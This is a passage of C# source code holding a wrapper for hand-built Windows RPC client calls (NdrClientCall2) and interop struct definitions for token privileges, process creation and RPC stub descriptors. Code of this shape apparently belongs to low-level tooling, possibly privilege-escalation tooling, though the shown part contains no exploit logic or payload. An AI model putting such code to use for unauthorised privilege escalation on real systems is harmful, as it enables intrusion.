        protected IntPtr GetStubHandle() { return stub.AddrOfPinnedObject(); }
        protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
        {
            GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
            IntPtr result;
            try { result = X.pfNdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject()); }
            finally { stackhandle.Free(); }
            return result;
        }
    }

    #region structs
    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public UInt32 Attributes;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr pSecurityDescriptor;
        public int bInheritHandle;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct COMM_FAULT_OFFSETS { public short CommOffset; public short FaultOffset; }
    [StructLayout(LayoutKind.Sequential)]
    struct RPC_VERSION
    {
        public ushort MajorVersion;
        public ushort MinorVersion;
        public RPC_VERSION(ushort maj, ushort min) { MajorVersion = maj; MinorVersion = min; }
    }
    [StructLayout(LayoutKind.Sequential)]
    struct RPC_SYNTAX_IDENTIFIER { public Guid SyntaxGUID; public RPC_VERSION SyntaxVersion; }
    [StructLayout(LayoutKind.Sequential)]
    struct RPC_CLIENT_INTERFACE
    {
        public uint Length;
        public RPC_SYNTAX_IDENTIFIER InterfaceId;
        public RPC_SYNTAX_IDENTIFIER TransferSyntax;
        public IntPtr DispatchTable;
        public uint RpcProtseqEndpointCount;
        public IntPtr RpcProtseqEndpoint;
        public IntPtr Reserved;
        public IntPtr InterpreterInfo;
        public uint Flags;
        public static Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);
        public RPC_CLIENT_INTERFACE(Guid iid, ushort maj, ushort min)
        {
            Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
            RPC_VERSION ver = new RPC_VERSION(maj, min);
            InterfaceId = new RPC_SYNTAX_IDENTIFIER(); InterfaceId.SyntaxGUID = iid; InterfaceId.SyntaxVersion = ver;
            ver = new RPC_VERSION(2, 0);
            TransferSyntax = new RPC_SYNTAX_IDENTIFIER(); TransferSyntax.SyntaxGUID = IID_SYNTAX; TransferSyntax.SyntaxVersion = ver;
            DispatchTable = IntPtr.Zero; RpcProtseqEndpointCount = 0u; RpcProtseqEndpoint = IntPtr.Zero;
            Reserved = IntPtr.Zero; InterpreterInfo = IntPtr.Zero; Flags = 0u;
        }
    }
    [StructLayout(LayoutKind.Sequential)]
    struct MIDL_STUB_DESC
    {
        public IntPtr RpcInterfaceInformation;
        public IntPtr pfnAllocate;
        public IntPtr pfnFree;
        public IntPtr pAutoBindHandle;
        public IntPtr apfnNdrRundownRoutines;
        public IntPtr aGenericBindingRoutinePairs;
        public IntPtr apfnExprEval;
        public IntPtr aXmitQuintuple;
        public IntPtr pFormatTypes;
        public int fCheckBounds;
        public uint Version;
        public IntPtr pMallocFreeStruct;
        public int MIDLVersion;
        public IntPtr CommFaultOffsets;
        public IntPtr aUserMarshalQuadruple;
        public IntPtr NotifyRoutineTable;
        public IntPtr mFlags;
        public IntPtr CsRoutineTables;
        public IntPtr ProxyServerInfo;
        public IntPtr pExprInfo;
        public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr, IntPtr pfnAllocatePtr, IntPtr pfnFreePtr)
        {
            pFormatTypes = pFormatTypesPtr; RpcInterfaceInformation = RpcInterfaceInformationPtr;
            CommFaultOffsets = IntPtr.Zero; pfnAllocate = pfnAllocatePtr; pfnFree = pfnFreePtr;
            pAutoBindHandle = IntPtr.Zero; apfnNdrRundownRoutines = IntPtr.Zero; aGenericBindingRoutinePairs = IntPtr.Zero;
            apfnExprEval = IntPtr.Zero; aXmitQuintuple = IntPtr.Zero; fCheckBounds = 1;
            Version = 0x50002u; pMallocFreeStruct = IntPtr.Zero; MIDLVersion = 0x801026e;
            aUserMarshalQuadruple = IntPtr.Zero; NotifyRoutineTable = IntPtr.Zero;
            mFlags = new IntPtr(0x00000001); CsRoutineTables = IntPtr.Zero; ProxyServerInfo = IntPtr.Zero; pExprInfo = IntPtr.Zero;
        }
    }
    #endregion
}
